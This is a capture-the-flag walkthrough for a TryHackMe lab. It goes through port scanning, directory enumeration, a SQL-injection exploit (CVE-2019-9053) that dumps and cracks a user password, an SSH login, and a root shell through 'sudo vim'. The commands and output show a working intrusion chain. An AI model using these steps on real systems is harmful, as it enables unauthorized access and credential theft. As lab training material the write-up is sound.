# TryHackMe CTF Walkthrough

## 1. Services Running Under Port 1000
**Question:** How many services are running under port 1000?  
**Answer:** 2  
**Command:** 
```bash
nmap -sV [Target_Machine_Ip] -T5
```

**Nmap Scan Results:**
```
Starting Nmap 7.94SVN (https://nmap.org) at 2024-10-03 13:06 EEST 
Nmap scan report for 10.10.66.220
Host is up (0.086s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 29.27 seconds
```

## 2. Higher Port Service
**Question:** What is running on the higher port?  
**Answer:** SSH  

## 3. CVE Used
**Question:** What's the CVE you're using against the application?  
**Answer:** CVE-2019-9053  

## 4. Directory Enumeration
**Command:**
```bash
gobuster dir -u http://[Target_Machine_Ip] -w /usr/share/wordlists/dirb/big.txt
```
**Gobuster Scan Results:**
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.66.220
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.66.220/simple/]                                                         

Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
```



## 5. Application Vulnerability
**Question:** To what kind of vulnerability is the application vulnerable?  
**Answer:** SQLi  


## 6. Exploiting the Vulnerability
**Question:** What can you leverage to exploit the vulnerability?  
**Answer:**   
**Command:**
```bash
python 46635.py -u http://[Target_Machine_Ip]/simple --crack -w /usr/share/wordlists/rockyou.txt
```

## 7. Exploit Output
**Question:** What information do you receive after exploiting the vulnerability?  
**Output:**
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

## 8. Login Information
**Question:** Where can you log in with the details obtained?  
**Answer:** SSH  

**Question:** What password do you enter when prompted?  
**Answer:** secret  

## 9. User Flag
**Question:** What’s the user flag?  
**Answer:** G___ ___, ____ _p!  
**Method:** After logging in, the user can easily find the `user.txt` file in the home directory.

## 10. Other User in Home Directory
**Question:** Is there any other user in the home directory? What’s its name?  
**Answer:** sunbath  
**Method:** Navigate to the previous directory using `cd ..` and list the contents with `ls` to find another user.

## 11. Spawning a Privileged Shell
**Question:** What can you leverage to spawn a privileged shell?  
**Answer:** vim  
**Method:** After running the command:
```bash
sudo -l
```

## 12. Command to Spawn Privileged Shell
**Question:** What command do you use to spawn a privileged shell?  
**Command:**
```bash
sudo vim -c ':!/bin/sh'
```

## 13. Finding the Root Flag
**Question:** How do you find the root flag?  
**Method:** Navigate to the root folder to find the `root.txt` file.  
**Command:**
```bash
cd /
ls
```
**Output:**
```
root.txt
```

**Flag:** W___ ____. ___ ____ _t!
